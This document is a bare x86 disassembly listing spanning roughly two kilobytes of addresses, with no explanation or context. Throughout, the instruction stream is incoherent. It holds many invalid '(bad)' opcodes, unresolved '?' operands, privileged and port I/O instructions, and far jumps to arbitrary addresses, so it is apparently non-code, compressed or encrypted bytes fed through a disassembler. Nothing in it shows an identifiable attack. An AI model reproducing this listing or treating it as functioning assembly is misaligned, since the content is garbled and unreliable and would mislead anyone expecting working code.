  4082cf:	in     al,dx
  4082d0:	mov    cs,WORD PTR [esi]
  4082d2:	aad    0x36
  4082d4:	mov    al,ds:0x4873b5c0
  4082d9:	adc    ah,BYTE PTR [ebp-0x929311e]
  4082df:	push   esi
  4082e0:	jns    0x40835d
  4082e2:	xchg   DWORD PTR [edx],edx
  4082e4:	arpl   WORD PTR [ecx],sp
  4082e6:	jmp    0x11bd:0xd29966f7
  4082ed:	push   edx
  4082ee:	fdivp  st(1),st
  4082f0:	outs   dx,BYTE PTR ds:[esi]
  4082f1:	call   DWORD PTR [ecx]
  4082f3:	popf   
  4082f4:	xor    DWORD PTR [esi+eax*8+0x33],esi
  4082f8:	mov    ebx,0x7e29bca1
  4082fd:	cmc    
  4082fe:	sub    BYTE PTR [edi],cl
  408300:	push   ebx
  408301:	lea    ebx,[eax+ebx*4+0x53]
  408305:	sbb    dh,BYTE PTR [ebx-0x5e041f03]
  40830b:	jno    0x408351
  40830d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40830e:	aaa    
  40830f:	lea    edi,[ebx]
  408311:	pop    ebx
  408312:	push   0xfdd2c881
  408317:	outs   dx,DWORD PTR ds:[esi]
  408318:	and    al,0x4e
  40831a:	(bad)  
  40831b:	(bad)  
  40831c:	sbb    BYTE PTR [si],bl
  40831f:	adc    DWORD PTR [eax],ebx
  408321:	retf   0xbc14
  408324:	or     DWORD PTR [ebx+edi*8],edi
  408327:	bound  edi,QWORD PTR [ebx-0x32]
  40832a:	nop
  40832b:	and    dh,BYTE PTR [ebx]
  40832d:	test   eax,0x23cc4a02
  408332:	sub    ch,ch
  408334:	mov    al,ds:0xc78942fb
  408339:	ror    DWORD PTR [esi-0x376a7600],1
  40833f:	adc    BYTE PTR [edx+0x21],0x2a
  408343:	push   es
  408344:	arpl   WORD PTR [eax-0x273cd391],bx
  40834a:	or     BYTE PTR [esi+0x14],0x79
  40834e:	inc    ebp
  40834f:	gs stos DWORD PTR es:[edi],eax
  408351:	and    dl,BYTE PTR [eax]
  408353:	and    eax,0x746e3008
  408358:	bound  ebx,QWORD PTR [ebx-0x3a]
  40835b:	adc    eax,0xcff5cea8
  408360:	fstp   DWORD PTR [edx+0xe]
  408363:	fmul   QWORD PTR [ebp+0x73]
  408366:	test   al,0x7b
  408368:	inc    eax
  408369:	repz cmp ebx,DWORD PTR [ebx]
  40836c:	or     BYTE PTR [esp+ebp*8],0x27
  408370:	mov    ?,WORD PTR [ecx]
  408372:	cmp    al,0x4c
  408374:	cmp    eax,0xebb873b2
  408379:	or     esp,DWORD PTR [eax]
  40837b:	gs loop 0x4083c6
  40837e:	rol    DWORD PTR [ebx+0x7556f5de],1
  408384:	pushf  
  408385:	pop    edi
  408386:	mov    eax,0x9a24eae8
  40838b:	mov    ch,0xd5
  40838d:	dec    ebp
  40838e:	popa   
  40838f:	pop    ds
  408390:	push   esi
  408391:	mov    ds:0x29d3b9f4,al
  408396:	sub    eax,0x157783ba
  40839b:	pop    esi
  40839c:	jns    0x4083e0
  40839e:	inc    esi
  40839f:	pop    eax
  4083a0:	call   0x976aa3f5
  4083a5:	mov    WORD PTR [edx-0x21387bb4],?
  4083ab:	or     edx,esp
  4083ad:	pop    edi
  4083ae:	adc    bh,ah
  4083b0:	dec    ebx
  4083b1:	push   ss
  4083b2:	gs jmp 0xe4a9ffc8
  4083b8:	nop
  4083b9:	idiv   BYTE PTR [eax+0x52867204]
  4083bf:	data16 adc al,0x7f
  4083c2:	(bad)  
  4083c3:	outs   dx,DWORD PTR ds:[esi]
  4083c4:	mov    WORD PTR [ebx+0x13110448],?
  4083ca:	mov    dh,dl
  4083cc:	pop    edx
  4083cd:	jmp    0x40835f
  4083cf:	pop    ss
  4083d0:	mov    cr3,ecx
  4083d3:	mov    dh,0x7e
  4083d5:	add    bl,BYTE PTR [edi+0x1faf6f91]
  4083db:	stos   DWORD PTR es:[edi],eax
  4083dc:	xchg   BYTE PTR [esi],al
  4083de:	repz mov eax,ds:0xafec8820
  4083e4:	sbb    ch,ch
  4083e6:	jne    0x4083b2
  4083e8:	js     0x408442
  4083ea:	add    ebx,ecx
  4083ec:	(bad)  
  4083ed:	jmp    0x828b:0x8fe4b4a1
  4083f4:	das    
  4083f5:	sub    BYTE PTR [esi+0x56],ch
  4083f8:	cmc    
  4083f9:	dec    ebx
  4083fa:	sbb    BYTE PTR [edx],cl
  4083fc:	or     DWORD PTR [edx],esp
  4083fe:	jl     0x4083b0
  408400:	cmp    eax,0x3a1711cb
  408405:	cmp    DWORD PTR [esp+ebp*8-0x19],edi
  408409:	push   0xffffff9d
  40840b:	push   esp
  40840c:	jmp    0xb360:0xfbf1822c
  408413:	and    ebx,DWORD PTR es:[ecx-0x12]
  408417:	or     DWORD PTR [edx+esi*1+0x36],0x3e9a9c7a
  40841f:	loopne 0x4083f8
  408421:	(bad)  
  408422:	mov    eax,ds:0xcea8fa6b
  408427:	jl     0x40847f
  408429:	iret   
  40842a:	fistp  DWORD PTR [ebp-0x62ea7d06]
  408430:	push   ss
  408431:	sub    eax,0xe69d348f
  408436:	push   es
  408437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408438:	jno    0x40848b
  40843a:	mov    ds:0xad5e685a,eax
  40843f:	rcl    bh,cl
  408441:	and    dl,al
  408443:	sub    BYTE PTR [esi-0x3348fe27],dl
  408449:	dec    edx
  40844a:	(bad)
  40844e:	jo     0x4083db
  408450:	inc    eax
  408451:	cmp    cl,BYTE PTR ds:0x183e4d88
  408457:	adc    BYTE PTR [esi-0x45682e78],ch
  40845d:	das    
  40845e:	cmp    eax,0x6a6f8682
  408463:	popf   
  408464:	lea    ebx,[esi+0x64]
  408467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408468:	push   ds
  408469:	das    
  40846a:	stos   DWORD PTR es:[edi],eax
  40846b:	fstp   QWORD PTR [ebx-0x20ddcc45]
  408471:	adc    ah,BYTE PTR [edi]
  408473:	fadd   st,st(4)
  408475:	add    ebp,DWORD PTR [edi-0x8]
  408478:	stc    
  408479:	pop    edi
  40847a:	fcom   DWORD PTR [ecx]
  40847c:	xchg   ecx,eax
  40847d:	pop    esi
  40847e:	gs fwait
  408480:	mov    cl,0x44
  408482:	and    eax,0x9fc8d260
  408487:	dec    edx
  408488:	pop    ss
  408489:	fdiv   DWORD PTR [edx-0x1e]
  40848c:	ss sub al,0xea
  40848f:	xchg   esi,eax
  408490:	xchg   ebp,eax
  408491:	cmp    edx,DWORD PTR [ecx]
  408493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408494:	idiv   BYTE PTR [ebp-0x6f]
  408497:	cwde   
  408498:	in     eax,dx
  408499:	retf   
  40849a:	fist   DWORD PTR [edi-0x63]
  40849d:	lahf   
  40849e:	aad    0x32
  4084a0:	scas   al,BYTE PTR es:[edi]
  4084a1:	and    DWORD PTR [eax+ecx*1],esp
  4084a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a5:	and    cl,ah
  4084a7:	fs scas eax,DWORD PTR es:[edi]
  4084a9:	and    DWORD PTR ds:0xe262388e,ebx
  4084af:	popa   
  4084b0:	jmp    0x24f8806c
  4084b5:	or     eax,DWORD PTR [ecx-0x67]
  4084b8:	xchg   ebx,eax
  4084b9:	fwait
  4084ba:	in     al,dx
  4084bb:	and    DWORD PTR [edx-0x29],ebp
  4084be:	xchg   esi,eax
  4084bf:	in     al,dx
  4084c0:	mov    dh,0xee
  4084c2:	fcomp  QWORD PTR [ebx]
  4084c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084c6:	jecxz  0x408501
  4084c8:	xor    al,0x66
  4084ca:	mov    ebx,0x86277bc1
  4084cf:	add    al,0xfa
  4084d1:	lahf   
  4084d2:	jb     0x4084c4
  4084d4:	out    dx,eax
  4084d5:	adc    esi,DWORD PTR [edi+0x6b]
  4084d8:	std    
  4084d9:	and    dl,ah
  4084db:	clc    
  4084dc:	xchg   edi,eax
  4084dd:	aas    
  4084de:	push   edx
  4084df:	pop    ebp
  4084e0:	repnz pop ebx
  4084e2:	pusha  
  4084e3:	mov    bh,0x84
  4084e5:	cli    
  4084e6:	outs   dx,BYTE PTR ds:[esi]
  4084e7:	cwde   
  4084e8:	or     al,0x74
  4084ea:	aam    0x8c
  4084ec:	in     al,dx
  4084ed:	add    BYTE PTR [edi-0x211105a1],0xcb
  4084f4:	dec    edi
  4084f5:	lods   al,BYTE PTR ds:[esi]
  4084f6:	or     al,0xc9
  4084f8:	mov    cl,0x96
  4084fa:	hlt    
  4084fb:	rol    ah,cl
  4084fd:	imul   BYTE PTR [esi]
  4084ff:	ret    
  408500:	mov    gs,WORD PTR [eax-0x379622dd]
  408506:	mov    al,0x13
  408508:	pop    esp
  408509:	sbb    DWORD PTR [ebp-0x4817c0bd],edi
  40850f:	daa    
  408510:	jp     0x4084ec
  408512:	xor    BYTE PTR [ecx-0x34],cl
  408515:	cmp    al,0xdd
  408517:	inc    esi
  408518:	cld    
  408519:	inc    esi
  40851a:	shl    bh,0xa
  40851d:	mov    al,0x20
  40851f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408520:	cli    
  408521:	data16 in al,0xa8
  408524:	nop
  408525:	rcl    ecx,1
  408527:	dec    esp
  408528:	mov    al,0x9c
  40852a:	mov    cl,0xc
  40852c:	push   ds
  40852d:	xchg   ebp,eax
  40852e:	mov    bh,0x1d
  408530:	push   0xc1f268ae
  408535:	cli    
  408536:	add    BYTE PTR [ebx],0x3a
  408539:	inc    esp
  40853a:	mov    DWORD PTR [ecx],edx
  40853c:	push   esi
  40853d:	cmp    BYTE PTR [edi+edx*8],bh
  408540:	push   cs
  408541:	pushf  
  408542:	mov    ecx,DWORD PTR [ebx+0x15]
  408545:	sti    
  408546:	div    DWORD PTR [edx-0x6e]
  408549:	push   edx
  40854a:	sbb    ebp,DWORD PTR [edi+0x62]
  40854d:	jl     0x408546
  40854f:	pop    ecx
  408550:	adc    bl,cl
  408552:	rcl    edi,cl
  408554:	leave  
  408555:	jmp    0x408583
  408557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408558:	mov    edx,0x6300b097
  40855d:	leave  
  40855e:	push   edx
  40855f:	inc    ecx
  408560:	out    0x63,al
  408562:	lock cmp ah,BYTE PTR [edx+0x46]
  408566:	ret    
  408567:	(bad)  
  408568:	std    
  408569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40856a:	sbb    edi,DWORD PTR [esp+eax*1+0x9]
  40856e:	cmc    
  40856f:	sahf   
  408570:	mov    edx,0x3dbe5b8a
  408575:	mov    al,0x6
  408577:	add    edx,DWORD PTR [esi-0x16]
  40857a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40857b:	clc    
  40857c:	push   edi
  40857d:	mov    ds:0x5eea513f,al
  408582:	sub    esi,ebp
  408584:	fcmovbe st,st(7)
  408586:	jmp    0x40859a
  408588:	ja     0x4085d6
  40858a:	pop    esp
  40858b:	repz jl 0x4085be
  40858e:	jmp    0x4799:0x9a565aa2
  408595:	ffree  st(5)
  408597:	adc    DWORD PTR ds:0xf59c8db7,ebx
  40859d:	gs cwde 
  40859f:	xchg   ecx,eax
  4085a0:	sbb    DWORD PTR [ebp+0x26094f0b],esp
  4085a6:	icebp  
  4085a7:	cmp    ch,BYTE PTR [edx]
  4085a9:	or     ebx,DWORD PTR [edi]
  4085ab:	je     0x408623
  4085ad:	hlt    
  4085ae:	fisub  DWORD PTR [eax]
  4085b0:	fwait
  4085b1:	(bad)  
  4085b2:	jne    0x408548
  4085b4:	and    al,0x8e
  4085b6:	sahf   
  4085b7:	dec    esi
  4085b8:	stos   BYTE PTR es:[edi],al
  4085b9:	sti    
  4085ba:	icebp  
  4085bb:	mov    ebp,0x709a0ae2
  4085c0:	aaa    
  4085c1:	pop    es
  4085c2:	js     0x408625
  4085c4:	lods   eax,DWORD PTR ds:[esi]
  4085c5:	xchg   DWORD PTR [edx+0x331c7d8f],edx
  4085cb:	arpl   WORD PTR [ecx-0x140c94aa],bx
  4085d1:	cmp    al,0xe8
  4085d3:	fdivr  DWORD PTR [edx+0x394392f0]
  4085d9:	fild   WORD PTR [ecx-0x7e]
  4085dc:	push   es
  4085dd:	mov    edi,0x77bd8353
  4085e2:	xchg   ebx,eax
  4085e3:	fdivr  st(6),st
  4085e5:	jb     0x4085ed
  4085e7:	xchg   ebp,eax
  4085e8:	sub    al,0x3c
  4085ea:	xchg   BYTE PTR [edi-0x4c61750d],ah
  4085f0:	test   al,0xd9
  4085f2:	dec    ebp
  4085f3:	int    0x1e
  4085f5:	imul   esp,DWORD PTR [eax-0x2d],0xdc7f9e82
  4085fc:	mov    al,0x60
  4085fe:	push   ds
  4085ff:	or     esp,DWORD PTR [ebx+0x21]
  408602:	or     DWORD PTR [eax-0x25],esp
  408605:	sbb    dl,BYTE PTR cs:[ebp-0x7d]
  408609:	in     eax,dx
  40860a:	sub    eax,0x921040fb
  40860f:	xchg   BYTE PTR ss:[esi-0x2c],ch
  408613:	push   ecx
  408614:	fcomp  DWORD PTR ds:0x1a66aadc
  40861a:	scas   al,BYTE PTR es:[edi]
  40861b:	shl    DWORD PTR [esi],0x4e
  40861e:	into   
  40861f:	jb     0x4085e1
  408621:	stos   BYTE PTR es:[edi],al
  408622:	fdivr  QWORD PTR [ecx]
  408624:	jl     0x4085ec
  408626:	mov    ds:0x7e675313,al
  40862b:	and    ebp,esi
  40862d:	inc    edx
  40862e:	mov    ch,0x5e
  408630:	pop    ebp
  408631:	jmp    0x408685
  408633:	lahf   
  408634:	cmp    eax,0xdedcbefb
  408639:	stc    
  40863a:	mov    eax,ds:0xeaecf19e
  40863f:	call   0x869b:0x1e8c51c6
  408646:	add    ah,BYTE PTR [ebx+0x23]
  408649:	and    BYTE PTR ds:0x79755ded,dh
  40864f:	scas   eax,DWORD PTR es:[edi]
  408650:	ins    BYTE PTR es:[edi],dx
  408651:	inc    edi
  408652:	or     edi,esi
  408654:	int    0x2d
  408656:	jno    0x408623
  408658:	mov    esp,0x311f5de2
  40865d:	lock inc ecx
  40865f:	jnp    0x40869b
  408661:	xlat   BYTE PTR ds:[ebx]
  408662:	xor    eax,0x485cf5e1
  408667:	scas   eax,DWORD PTR es:[edi]
  408668:	es je  0x408666
  40866b:	xchg   edx,eax
  40866c:	(bad)  
  40866d:	lock dec ecx
  40866f:	pop    ecx
  408670:	mov    cl,0xcf
  408672:	jbe    0x4086dd
  408674:	add    cl,al
  408676:	stc    
  408677:	adc    al,0x3f
  408679:	ss push 0x40
  40867c:	mov    BYTE PTR [esi],dh
  40867e:	inc    esp
  40867f:	inc    ebp
  408680:	out    0xdc,al
  408682:	call   0x46d0:0xbfb573d1
  408689:	lahf   
  40868a:	push   ebp
  40868b:	dec    ebx
  40868c:	or     al,0x1a
  40868e:	loopne 0x4086dd
  408690:	dec    ebp
  408691:	out    dx,eax
  408692:	push   esi
  408693:	jbe    0x4086a7
  408695:	shl    BYTE PTR [edx+0x27],0xbb
  408699:	mov    WORD PTR [ecx],ss
  40869b:	pop    es
  40869c:	test   BYTE PTR [esi-0x2019f68d],0x98
  4086a3:	dec    edi
  4086a4:	ss iret 
  4086a6:	lds    esp,FWORD PTR [ecx]
  4086a8:	ins    BYTE PTR es:[edi],dx
  4086a9:	cmp    DWORD PTR [esi-0x4a991073],ebp
  4086af:	aad    0xb5
  4086b1:	or     DWORD PTR [ebx],ebx
  4086b3:	mov    edx,0xc4c4bcea
  4086b8:	iret   
  4086b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ba:	jne    0x40865f
  4086bc:	pop    edi
  4086bd:	pop    es
  4086be:	mov    WORD PTR ds:0x33c873aa,fs
  4086c4:	or     BYTE PTR [ecx+0x264f7228],ah
  4086ca:	hlt    
  4086cb:	mov    WORD PTR [edx],ds
  4086cd:	pop    edi
  4086ce:	cmp    DWORD PTR [esi-0x7d693da8],0x505a322b
  4086d8:	jge    0x408681
  4086da:	pop    ss
  4086db:	je     0x4086f7
  4086dd:	adc    DWORD PTR [ebp-0x7afc933],esi
  4086e3:	mov    esi,0x86ea4b7
  4086e8:	mov    bl,0x75
  4086ea:	or     dh,BYTE PTR [ebx+edi*1]
  4086ed:	add    ecx,DWORD PTR [edx-0x57]
  4086f0:	mov    dh,0x38
  4086f2:	retf   0xcdf7
  4086f5:	mov    esi,0x15d11ede
  4086fa:	adc    eax,0xc8d8bee1
  4086ff:	and    DWORD PTR [ebx],ecx
  408701:	cmp    edi,0xffffffcb
  408704:	sbb    bl,0x97
  408707:	xor    esp,DWORD PTR [eax+0x4b]
  40870a:	jne    0x4086b3
  40870c:	sahf   
  40870d:	push   esp
  40870e:	sub    al,0x8c
  408710:	and    BYTE PTR [edi-0x27],bl
  408713:	lea    esi,[eax]
  408715:	dec    esi
  408716:	(bad)
  40871a:	ret    
  40871b:	push   0x9ad536d6
  408720:	adc    BYTE PTR [eax+ecx*8+0x62867de6],bl
  408727:	ins    BYTE PTR es:[edi],dx
  408728:	adc    eax,0xd0466e68
  40872d:	cli    
  40872e:	mov    al,ds:0x41bef8a8
  408733:	in     eax,0xd4
  408735:	sahf   
  408736:	dec    edx
  408737:	fild   DWORD PTR [edx]
  408739:	mov    dh,0x90
  40873b:	scas   al,BYTE PTR es:[edi]
  40873c:	cmp    BYTE PTR [edx+0x2],bh
  40873f:	pop    ebx
  408740:	aad    0x90
  408742:	int    0x3b
  408744:	ds xor ch,cl
  408747:	mov    bh,0x4e
  408749:	pop    es
  40874a:	sbb    BYTE PTR [ebp+0x363bc619],0x3
  408751:	lods   al,BYTE PTR ds:[esi]
  408752:	loopne 0x408728
  408754:	xor    eax,esp
  408756:	stos   DWORD PTR es:[edi],eax
  408757:	jb     0x40873d
  408759:	popf   
  40875a:	test   esi,ebx
  40875c:	out    dx,al
  40875d:	xor    al,0xa8
  40875f:	mov    ah,0xb8
  408761:	inc    ebx
  408762:	lods   eax,DWORD PTR ds:[esi]
  408763:	xchg   ecx,eax
  408764:	inc    esi
  408765:	sar    DWORD PTR cs:[edx-0x1d],0x45
  40876a:	and    al,0x1b
  40876c:	call   0x8f95:0x43fd3a4a
  408773:	in     eax,dx
  408774:	sbb    al,0x21
  408776:	call   0x42a0a14c
  40877b:	sbb    eax,0x686dcd3e
  408780:	or     DWORD PTR [eax-0x1e],esp
  408783:	adc    eax,0x9d65dd5f
  408788:	or     eax,0x11c42841
  40878d:	enter  0xace4,0x5
  408791:	pusha  
  408792:	imul   edx,DWORD PTR [edx+0x6e271eb9],0xffffff8e
  408799:	ss daa 
  40879b:	lods   eax,DWORD PTR ds:[esi]
  40879c:	mov    ah,0x42
  40879e:	xchg   edx,eax
  40879f:	add    esp,eax
  4087a1:	in     al,dx
  4087a2:	fisttp WORD PTR [edi+0xa40be38]
  4087a8:	push   edi
  4087a9:	test   eax,0x7efc602b
  4087ae:	pcmpeqd mm6,QWORD PTR [eax-0x7b]
  4087b2:	mov    DWORD PTR [edx-0x15],esi
  4087b5:	mul    DWORD PTR ds:0x3be6e0b0
  4087bb:	sahf   
  4087bc:	pop    ecx
  4087bd:	adc    bh,BYTE PTR [edx]
  4087bf:	xchg   ebp,eax
  4087c0:	loope  0x408782
  4087c2:	ror    BYTE PTR [edx+0x29],0x77
  4087c6:	lea    edx,[eax+edi*4]
  4087c9:	add    BYTE PTR [edi-0x5b88225c],bl
  4087cf:	xchg   BYTE PTR [ecx+eax*1-0x34],ch
  4087d3:	daa    
  4087d4:	loopne 0x4087d6
  4087d6:	jbe    0x408848
  4087d8:	pushf  
  4087d9:	and    dl,BYTE PTR [ecx-0x33d504e5]
  4087df:	xchg   ebp,eax
  4087e0:	dec    ebp
  4087e1:	icebp  
  4087e2:	add    dh,BYTE PTR [esi-0x6f]
  4087e5:	xor    eax,eax
  4087e7:	sub    DWORD PTR [edx-0x780f9fd8],edi
  4087ed:	mov    esi,0xb8608e73
  4087f2:	inc    ebp
  4087f3:	or     bh,BYTE PTR [ebp+0x79797900]
  4087f9:	dec    eax
  4087fa:	out    dx,eax
  4087fb:	loope  0x408847
  4087fd:	and    eax,0x1a153eb8
  408802:	jmp    0x40879d
  408804:	test   DWORD PTR [ebx+0x2b],0x142b827a
  40880b:	jp     0x408885
  40880d:	aas    
  40880e:	xchg   ebp,edx
  408810:	cmp    bl,BYTE PTR [edx-0x7cbe115]
  408816:	jae    0x4087cb
  408818:	push   0xa0063240
  40881d:	test   DWORD PTR [eax+0x40],ebx
  408820:	js     0x4087ee
  408822:	mov    WORD PTR [edi+0x5156ea1],ss
  408828:	pushf  
  408829:	(bad)  
  40882a:	pop    ebx
  40882b:	jp     0x4087b4
  40882d:	pop    esp
  40882e:	int3   
  40882f:	add    DWORD PTR [edi-0x2299e399],ebp
  408835:	or     esi,DWORD PTR [edi]
  408837:	sub    bh,BYTE PTR [ebp+0x78]
  40883a:	fnstenv [edi+eiz*8+0x16]
  40883e:	push   ax
  408840:	arpl   WORD PTR [ecx],dx
  408842:	(bad)
  408845:	push   ebp
  408846:	mov    esi,0x7bd41ceb
  40884b:	jno    0x4088b2
  40884d:	push   edi
  40884e:	in     eax,0xf8
  408850:	in     eax,dx
  408851:	xor    ecx,edi
  408853:	retf   
  408854:	popf   
  408855:	jo     0x4087e8
  408857:	xchg   ebp,eax
  408858:	sbb    al,0x49
  40885a:	cmp    ebp,0x3d3f4b4b
  408860:	ret    
  408861:	xchg   edi,eax
  408862:	dec    esp
  408863:	push   edx
  408864:	(bad)  
  408865:	scas   al,BYTE PTR es:[edi]
  408866:	pop    ss
  408867:	sbb    edx,DWORD PTR [ecx+0x2f]
  40886a:	test   esp,0x7bf4827b
  408870:	lock xchg esi,eax
  408872:	pop    ebx
  408873:	inc    esp
  408874:	cs clc 
  408876:	xor    eax,0x9d22a7bb
  40887b:	pop    ecx
  40887c:	mov    al,0x72
  40887e:	mov    al,ds:0x9fa3348b
  408883:	cdq    
  408884:	push   ss
  408885:	and    dl,BYTE PTR [edx+0x21]
  408888:	mov    ds:0x88ebc25c,al
  40888d:	adc    dl,BYTE PTR [ebx+0x6a9e1642]
  408893:	fild   QWORD PTR [edx+0x23cc3aea]
  408899:	out    0x94,al
  40889b:	jmp    0x408902
  40889d:	lahf   
  40889e:	xchg   ebp,esi
  4088a0:	xchg   DWORD PTR [ecx-0x4f],esp
  4088a3:	repz fisttp QWORD PTR [ebp+0x5bef9e1f]
  4088aa:	push   ss
  4088ab:	test   al,0x8d
  4088ad:	lds    esi,FWORD PTR [eax+0x43]
  4088b0:	aam    0x46
  4088b2:	cwde   
  4088b3:	xchg   esi,eax
  4088b4:	mov    ebp,?
  4088b6:	repnz not edi
  4088b9:	sbb    eax,0x95e8b657
  4088be:	adc    al,0xf2
  4088c0:	cmp    bl,dl
  4088c2:	mov    eax,ds:0x581016c
  4088c7:	dec    esi
  4088c8:	lock data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088cb:	or     BYTE PTR [esi],0xee
  4088ce:	jl     0x408871
  4088d0:	pop    esi
  4088d1:	jl     0x40887a
  4088d3:	mov    ?,esi
  4088d5:	xchg   ecx,eax
  4088d6:	lds    esi,FWORD PTR [ebp-0x59]
  4088d9:	pop    es
  4088da:	leave  
  4088db:	and    esp,ecx
  4088dd:	repz mov bl,0x1a
  4088e0:	push   0x16d64ff6
  4088e5:	aaa    
  4088e6:	mov    cl,0x7c
  4088e8:	xchg   esp,eax
  4088e9:	jp     0x408910
  4088eb:	xor    ecx,DWORD PTR [esi+0xc12f00f]
  4088f1:	push   0xd8c4678a
  4088f6:	aas    
  4088f7:	mov    ecx,0xb8c51802
  4088fc:	(bad)  
  4088fd:	xor    eax,0x354139f6
  408902:	fild   QWORD PTR [ecx-0x40]
  408905:	sbb    cl,BYTE PTR [ebx-0x1c80b2af]
  40890b:	push   edx
  40890c:	inc    ebp
  40890d:	jne    0x408927
  40890f:	or     BYTE PTR [eax+0x16],bl
  408912:	je     0x4088ef
  408914:	scas   al,BYTE PTR es:[edi]
  408915:	mov    edi,eax
  408917:	add    al,0x17
  408919:	jle    0x408910
  40891b:	mov    bh,0x97
  40891d:	outs   dx,DWORD PTR ds:[esi]
  40891e:	or     BYTE PTR [edx+0x42],dl
  408921:	xchg   ecx,eax
  408922:	lds    edi,FWORD PTR [eax+0x41b38e25]
  408928:	dec    eax
  408929:	jns    0x408977
  40892b:	xchg   ebp,eax
  40892c:	mov    esi,0xeb718c9e
  408931:	lea    ebp,[edi]
  408933:	pop    ds
  408934:	loope  0x40897b
  408936:	adc    BYTE PTR [ebp-0x4],cl
  408939:	dec    ebx
  40893a:	ins    DWORD PTR es:[edi],dx
  40893b:	leave  
  40893c:	in     eax,0xf1
  40893e:	out    dx,al
  40893f:	in     eax,0xe0
  408941:	inc    edx
  408942:	shl    BYTE PTR [ebp+edx*1+0x5dc52dd],0x54
  40894a:	out    0xce,eax
  40894c:	sub    BYTE PTR [eax+0x26a0e1ec],al
  408952:	sub    ebx,0xfb5b8f24
  408958:	inc    ecx
  408959:	test   al,0xd0
  40895b:	scas   al,BYTE PTR es:[edi]
  40895c:	test   ecx,edx
  40895e:	mov    WORD PTR [ebp-0x63],es
  408961:	pusha  
  408962:	lds    edi,FWORD PTR [ebx+0x17]
  408965:	rcl    eax,1
  408967:	cs xchg edx,eax
  408969:	xchg   ecx,eax
  40896a:	cld    
  40896b:	add    eax,0xe38589a8
  408970:	inc    edx
  408971:	test   eax,0x3782a266
  408976:	push   ecx
  408977:	int3   
  408978:	pop    esi
  408979:	sbb    eax,0x3ddd0349
  40897e:	call   0xd406:0x29eb2340
  408985:	lahf   
  408986:	pop    edi
  408987:	xor    ebx,0x5d
  40898a:	in     eax,0xd3
  40898c:	fwait
  40898d:	jo     0x4089c1
  40898f:	mov    cx,0xf7db
  408993:	push   ebp
  408994:	sbb    BYTE PTR [esp+esi*8+0x1c1f736b],al
  40899b:	test   al,0x38
  40899d:	lods   al,BYTE PTR ds:[esi]
  40899e:	mov    ebx,0x7eb1e2b0
  4089a3:	cmp    al,0x2f
  4089a5:	mov    bh,0x5c
  4089a7:	aam    0x52
  4089a9:	sub    DWORD PTR [edx-0x447365d4],esp
  4089af:	add    bh,ah
  4089b1:	sub    dl,BYTE PTR [esi+0x42]
  4089b4:	leave  
  4089b5:	loop   0x408998
  4089b7:	mov    esi,0x7118d140
  4089bc:	sar    BYTE PTR [ebx+0x771d7e05],0xa2
  4089c3:	call   0xbc7c:0xbe69d734
  4089ca:	xor    eax,0x7e02f94f
  4089cf:	jne    0x408994
  4089d1:	(bad)  [eax]
  4089d3:	lods   al,BYTE PTR ds:[esi]
  4089d4:	clc    
  4089d5:	cmp    edi,ecx
  4089d7:	push   edi
  4089d8:	sbb    ecx,DWORD PTR [edi-0x26]
  4089db:	xchg   esp,eax
  4089dc:	les    esi,FWORD PTR [edi+0xa]
  4089df:	sbb    DWORD PTR [ebp+0x6a140077],0x3e
  4089e6:	lock loope 0x408a03
  4089e9:	adc    dl,BYTE PTR [edx-0x3fc41387]
  4089ef:	sub    BYTE PTR [edi],0xee
  4089f2:	push   cs
  4089f3:	test   eax,0x30454224
  4089f8:	test   al,0xc
  4089fa:	and    al,0xa2
  4089fc:	mov    esp,0xada96ff4
  408a01:	mov    ds:0x4f1f9e5a,eax
  408a06:	sbb    edi,esp
  408a08:	mov    dl,BYTE PTR ds:[ecx]
  408a0b:	hlt    
  408a0c:	pop    eax
  408a0d:	or     cl,BYTE PTR [esi-0x75ae3c49]
  408a13:	(bad)  [edi+0x6102fd06]
  408a19:	cmp    ah,dh
  408a1b:	popa   
  408a1c:	or     BYTE PTR [eax-0x4849d78],al
  408a22:	mov    ds:0x44fe1f8a,eax
  408a27:	adc    edi,esp
  408a29:	scas   al,BYTE PTR es:[edi]
  408a2a:	mov    bl,0xb4
  408a2c:	pop    edi
  408a2d:	mov    esp,0x3f71c935
  408a32:	mov    WORD PTR [ecx-0x3f],ss
  408a35:	add    al,0xbc
  408a37:	cmc    
  408a38:	dec    edx
  408a39:	jge    0x408a30
  408a3b:	mov    eax,ds:0xfab2eda6
  408a40:	push   0xffffff9e
  408a42:	push   esi
  408a43:	add    BYTE PTR [ecx-0x30dc4fcb],ch
  408a49:	mov    bl,0xdb
  408a4b:	test   eax,0x64d12a8d
  408a50:	add    BYTE PTR [edi-0x2283e099],dl
  408a56:	mov    eax,ds:0xc9512d94
  408a5b:	aam    0xbb
  408a5d:	ins    DWORD PTR es:[edi],dx
  408a5e:	pop    esp
  408a5f:	mov    ebx,eax
  408a61:	ss mov bh,0xdf
  408a64:	add    DWORD PTR [edi],eax
  408a66:	stc    
  408a67:	dec    edi
  408a68:	mov    esp,0xac3fc1c7
  408a6d:	sbb    eax,0xb864fe5e
  408a72:	push   esp
  408a73:	mov    ah,0x1d
  408a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a76:	nop
  408a77:	pop    edi
  408a78:	and    ebx,esp
  408a7a:	outs   dx,BYTE PTR ds:[esi]
  408a7b:	push   ebp
  408a7c:	in     eax,0x13
  408a7e:	xchg   edx,eax
  408a7f:	and    eax,0x99290906
  408a84:	stc    
  408a85:	add    BYTE PTR [eax-0x6b16c000],al
  408a8b:	dec    eax
  408a8c:	es mov ebp,0xb0a7a6f8
  408a92:	fst    DWORD PTR [edx-0x4e]
  408a95:	mov    ds:0xb30348d9,eax
  408a9a:	sbb    edx,DWORD PTR [esp+ebp*4]
  408a9d:	cs or  eax,0x569930a5
  408aa3:	out    0x5,al
  408aa5:	and    esp,ebx
  408aa7:	mov    eax,ds:0xf1134a84
  408aac:	imul   esp,DWORD PTR [edx-0x24],0xdd2d0235
